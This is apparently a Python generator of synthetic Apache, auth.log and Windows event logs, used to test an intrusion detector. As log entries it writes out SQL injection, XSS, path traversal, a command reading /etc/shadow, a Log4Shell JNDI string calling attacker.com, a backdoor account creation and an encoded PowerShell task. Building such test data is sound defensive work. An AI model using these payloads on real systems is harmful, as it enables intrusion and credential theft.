# =============================================================================
# sample_logs/generator.py — Generate realistic test logs with injected attacks
# =============================================================================
# Creates sample log files you can immediately use to test the detector.
# Generates a mix of normal traffic + injected attack patterns.
# Run: python sample_logs/generator.py
# =============================================================================

import random
import os
from datetime import datetime, timedelta, timezone

random.seed(42)

NORMAL_IPS   = [f"192.168.1.{i}" for i in range(10, 50)]
ATTACK_IPS   = ["45.33.32.156", "198.51.100.23", "203.0.113.77", "185.220.101.5"]
NORMAL_PATHS = [
    "/", "/index.html", "/about", "/contact", "/products", "/login",
    "/api/v1/users", "/api/v1/products", "/static/app.js", "/favicon.ico",
    "/images/logo.png", "/blog", "/blog/post-1", "/search?q=shoes",
]
ATTACK_PATHS = [
    "/?id=1' OR '1'='1",
    "/search?q=<script>alert(1)</script>",
    "/../../etc/passwd",
    "/admin/login.php",
    "/.env",
    "/wp-admin/",
    "/api/v1/users?id=1; DROP TABLE users--",
    "/?cmd=cat /etc/shadow",
    "/phpmyadmin/",
    "/?jndi=ldap://attacker.com:1389/Exploit",
    "/.git/config",
    "/backup.sql",
    "/xmlrpc.php",
    "/api/swagger.json",
]
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
]
ATTACK_AGENTS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "Mozilla/5.0 (compatible; Googlebot/2.1) [NIKTO]",
    "python-requests/2.31.0",
    "Go-http-client/1.1",
    "curl/7.88.1",
]
USERS    = ["alice", "bob", "carol", "dave", "sysadmin", "webadmin"]
METHODS  = ["GET"] * 7 + ["POST"] * 2 + ["PUT"] + ["DELETE"]


def _random_ts(base: datetime, delta_seconds: int = 0) -> str:
    ts = base + timedelta(seconds=delta_seconds)
    return ts.strftime("%d/%b/%Y:%H:%M:%S +0000")


def generate_apache_log(path: str = "sample_logs/sample_apache.log", lines: int = 2000):
    """Generate a realistic Apache access log with injected attacks."""
    base  = datetime(2024, 10, 14, 7, 0, 0, tzinfo=timezone.utc)  # Monday
    out   = []

    # Normal traffic throughout the day
    for i in range(lines):
        ip     = random.choice(NORMAL_IPS)
        method = random.choice(METHODS)
        path_  = random.choice(NORMAL_PATHS)
        status = random.choices([200, 304, 404, 500], weights=[75, 10, 12, 3])[0]
        bytes_ = random.randint(200, 50000) if status == 200 else random.randint(0, 500)
        ua     = random.choice(USER_AGENTS)
        ts     = _random_ts(base, i * 20 + random.randint(-5, 5))
        out.append(f'{ip} - - [{ts}] "{method} {path_} HTTP/1.1" {status} {bytes_} "-" "{ua}"')

    # --- Inject: SQLi attacker (sustained) ---
    attacker = ATTACK_IPS[0]
    for i in range(80):
        ts = _random_ts(base, 3600 + i * 8)  # 1 hour in, rapid-fire
        path_ = random.choice(ATTACK_PATHS[:4])
        out.append(f'{attacker} - - [{ts}] "GET {path_} HTTP/1.1" 200 1024 "-" "{ATTACK_AGENTS[0]}"')

    # --- Inject: Scanner with Nikto ---
    scanner = ATTACK_IPS[1]
    scan_paths = ATTACK_PATHS + NORMAL_PATHS + [f"/{i}" for i in range(50)]
    for i, p in enumerate(scan_paths):
        ts = _random_ts(base, 7200 + i * 2)  # 2 hours in, very fast
        out.append(f'{scanner} - - [{ts}] "GET {p} HTTP/1.1" 404 217 "-" "{ATTACK_AGENTS[1]}"')

    # --- Inject: Log4Shell attempt ---
    l4s_ip = ATTACK_IPS[2]
    ts = _random_ts(base, 10800)
    ua = "${jndi:ldap://attacker.com:1389/Exploit}"
    out.append(f'{l4s_ip} - - [{ts}] "GET / HTTP/1.1" 200 5120 "-" "{ua}"')

    # --- Inject: Large data transfer (exfiltration hint) ---
    exfil_ip = ATTACK_IPS[3]
    ts = _random_ts(base, 14400)
    out.append(f'{exfil_ip} - - [{ts}] "GET /api/v1/users?export=all HTTP/1.1" 200 9999999 "-" "{USER_AGENTS[0]}"')

    # --- Inject: Off-hours admin (3 AM) ---
    ts = _random_ts(datetime(2024, 10, 15, 3, 17, 0, tzinfo=timezone.utc), 0)
    out.append(f'10.0.0.5 - admin [{ts}] "POST /admin/users/delete HTTP/1.1" 200 250 "-" "{USER_AGENTS[0]}"')

    random.shuffle(out)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write("\n".join(out) + "\n")
    print(f"[Generator] Apache log: {path} ({len(out)} lines)")
    return path


def generate_syslog(path: str = "sample_logs/sample_syslog.log", lines: int = 1000):
    """Generate a Linux auth.log / syslog with brute force attacks injected."""
    base = datetime(2024, 10, 14, 6, 0, 0, tzinfo=timezone.utc)
    out  = []
    MONTHS = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"]

    def ts(delta):
        t = base + timedelta(seconds=delta)
        return f"{MONTHS[t.month-1]} {t.day:2d} {t.hour:02d}:{t.minute:02d}:{t.second:02d}"

    # Normal activity
    for i in range(lines):
        user = random.choice(USERS)
        ip   = random.choice(NORMAL_IPS)
        t    = ts(i * 30)
        evt  = random.choices(
            ["Accepted", "session opened", "COMMAND", "pam_unix"],
            weights=[30, 30, 20, 20]
        )[0]
        if evt == "Accepted":
            out.append(f"{t} webserver01 sshd[{random.randint(1000,9999)}]: Accepted password for {user} from {ip} port {random.randint(20000,60000)} ssh2")
        elif evt == "session opened":
            out.append(f"{t} webserver01 sshd[{random.randint(1000,9999)}]: pam_unix(sshd:session): session opened for user {user} by (uid=0)")
        elif evt == "COMMAND":
            out.append(f"{t} webserver01 sudo: {user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/apt update")
        else:
            out.append(f"{t} webserver01 pam_unix[{random.randint(1000,9999)}]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip} user={user}")

    # --- Inject: Brute force from single IP (fast) ---
    brute_ip = ATTACK_IPS[0]
    for i in range(200):
        t = ts(3600 + i * 3)
        user = random.choice(["root", "admin", "ubuntu", "pi"])
        pid  = random.randint(10000, 20000)
        out.append(f"{t} webserver01 sshd[{pid}]: Failed password for {user} from {brute_ip} port {random.randint(20000,60000)} ssh2")

    # --- Inject: Slow brute (spread over 2 hours) ---
    slow_ip = ATTACK_IPS[1]
    for i in range(15):
        t = ts(7200 + i * 500)  # one attempt every ~8 minutes
        pid = random.randint(10000, 20000)
        out.append(f"{t} webserver01 sshd[{pid}]: Failed password for root from {slow_ip} port {random.randint(20000,60000)} ssh2")

    # --- Inject: Successful root login at 3 AM ---
    t = ts(75600)  # 9 PM + 6h = 3 AM next day
    out.append(f"{t} webserver01 sshd[31337]: Accepted password for root from {ATTACK_IPS[2]} port 54321 ssh2")
    out.append(f"{t} webserver01 sudo: root : TTY=pts/1 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd backdoor")

    # --- Inject: Account lockout ---
    t = ts(14400)
    out.append(f"{t} webserver01 pam_tally2[12345]: user alice (uid=1001) tally 6, deny 5")

    random.shuffle(out)
    with open(path, "w") as f:
        f.write("\n".join(out) + "\n")
    print(f"[Generator] Syslog: {path} ({len(out)} lines)")
    return path


def generate_windows_event(path: str = "sample_logs/sample_windows.jsonl", lines: int = 500):
    """Generate Windows Event Log JSON (one JSON object per line)."""
    import json
    base = datetime(2024, 10, 14, 8, 0, 0, tzinfo=timezone.utc)
    out  = []

    LOGON_EVENT_IDS = ["4624", "4625", "4648"]
    ADMIN_EVENT_IDS = ["4720", "4726", "4732", "4719", "7045", "1102", "4698"]

    def make_event(event_id, user, ip, delta, extra=None):
        ts = (base + timedelta(seconds=delta)).strftime("%Y-%m-%dT%H:%M:%SZ")
        ev = {
            "EventID": event_id,
            "TimeCreated": ts,
            "Computer": "WIN-DC01",
            "EventData": {
                "TargetUserName": user,
                "IpAddress": ip,
                "LogonType": "3",
                **(extra or {})
            }
        }
        return json.dumps(ev)

    # Normal logon/logoff
    for i in range(lines):
        user  = random.choice(USERS)
        ip    = random.choice(NORMAL_IPS)
        eid   = random.choices(LOGON_EVENT_IDS, weights=[70, 20, 10])[0]
        out.append(make_event(eid, user, ip, i * 60))

    # --- Inject: Multiple failed logons (4625) for same user ---
    for i in range(40):
        out.append(make_event("4625", "administrator", ATTACK_IPS[0],
                              3600 + i * 30, {"LogonType": "3"}))

    # --- Inject: New user account created (persistence) ---
    out.append(make_event("4720", "backdoor_user", "10.0.0.5",
                          7200, {"SubjectUserName": "attacker"}))

    # --- Inject: Scheduled task created ---
    ts_str = (base + timedelta(hours=4)).strftime("%Y-%m-%dT%H:%M:%SZ")
    out.append(json.dumps({
        "EventID": "4698", "TimeCreated": ts_str, "Computer": "WIN-DC01",
        "EventData": {
            "SubjectUserName": "SYSTEM",
            "TaskName": "\\Microsoft\\Windows\\UpdateCheck",
            "TaskContent": "cmd.exe /c powershell -enc JABj..."
        }
    }))

    # --- Inject: Log cleared ---
    ts_str = (base + timedelta(hours=6)).strftime("%Y-%m-%dT%H:%M:%SZ")
    out.append(json.dumps({
        "EventID": "1102", "TimeCreated": ts_str, "Computer": "WIN-DC01",
        "EventData": {"SubjectUserName": "administrator", "SubjectLogonId": "0x3e7"}
    }))

    # --- Inject: Special privileges (admin logon) at 2 AM ---
    ts_str = (base + timedelta(hours=18)).strftime("%Y-%m-%dT%H:%M:%SZ")
    out.append(json.dumps({
        "EventID": "4672", "TimeCreated": ts_str, "Computer": "WIN-DC01",
        "EventData": {
            "SubjectUserName": "backdoor_user",
            "IpAddress": ATTACK_IPS[3],
            "PrivilegeList": "SeDebugPrivilege\nSeTcbPrivilege\nSeSecurityPrivilege"
        }
    }))

    random.shuffle(out)
    with open(path, "w") as f:
        f.write("\n".join(out) + "\n")
    print(f"[Generator] Windows Event Log: {path} ({len(out)} lines)")
    return path


if __name__ == "__main__":
    print("Generating sample log files...\n")
    generate_apache_log()
    generate_syslog()
    generate_windows_event()
    print("\nDone! Files written to sample_logs/")
    print("You can now analyse them via the API or CLI.")
